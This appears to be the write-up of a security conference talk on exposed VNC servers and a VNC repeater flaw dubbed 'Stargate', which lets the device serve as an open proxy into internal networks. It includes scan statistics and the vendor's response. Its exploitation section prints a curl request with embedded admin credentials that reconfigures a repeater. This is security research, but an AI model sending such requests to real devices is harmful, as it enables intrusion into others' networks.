### Introduction
The state of internet security is concerning. This presentation aims to guide you through the current landscape, focusing on the vulnerabilities and risks associated with VNC (Virtual Network Computing) and other connected devices.

### The Current State
- **Security on the Internet**: The situation is deteriorating.
- **IoT Devices**: Many new and old devices are being connected to the internet without proper security measures.
- **Examples of Insecure Devices**:
  - Security cameras
  - Industrial control systems
  - Consumer electronics (e.g., German 'Sonnenbatterie' solar-cell power storage systems)
  - Boats
  - Medical devices (e.g., cardiac imaging systems)
  - Biometric data (e.g., fingerprints)

### Common Issues
- **Lack of Authentication**: Many devices, including those with Wi-Fi and Telnet, do not have proper authentication mechanisms.
- **Known Vulnerabilities**: There are documented CVEs (Common Vulnerabilities and Exposures) for these issues.
- **Exploitation by Hackers**: These vulnerabilities are actively being exploited by malicious actors.

### Statistics on VNC
- **Global Scan**: A scan of the RFB (Remote Frame Buffer) protocol header revealed approximately 335,000 results, with around 8,000 of these using no authentication.
- **RFB Versions**:
  - Various versions of RFB were detected, including some that should not be in use.
  - Notable versions include Apple Remote Desktop, RealVNC Personal, and RealVNC Enterprise.
  - An unknown number of devices responded with "RFB 000.000," and 3,500 devices were identified as "RealVNC repeaters."

### Stargate: The Vulnerability
- **Description**: We refer to this vulnerability as "Stargate." It allows an open proxy to be used to pivot into internal networks.
- **Vendor Response**:
  - Fixed port wrapping issue.
  - Will not enforce VNC due to product compatibility.
  - Will implement whitelisting instead of blacklisting.
  - The product will remain a plain TCP proxy without inspection.

### Exploitation Example
- **Command**:
  ```bash
  curl "http://localhost/testaction.cgi?mode2=mode2&server_port=5901&viewer_port=5500&allow_on=allow_on&allow_con=&refuse_con=&id_con=&web_port=80&hidden=" -H "Authorization: Basic YWRtaW46YWRtaW5hZG1pMg=="
  ```
- **Warning**: Do not run this command. It is provided for educational purposes only.

### Tools and Resources
- **Python Scripts**: Available on GitHub. Use with caution and responsibly.
  - [GitHub Repository](https://www.github.com/0x3a/stargate/)
- **Community Engagement**: If you use these tools in a penetration test, please share your experiences with us.

### Conclusion
The internet's security landscape is challenging, but with awareness and responsible action, we can mitigate the risks. Stay vigilant and contribute to the community's efforts to improve security.
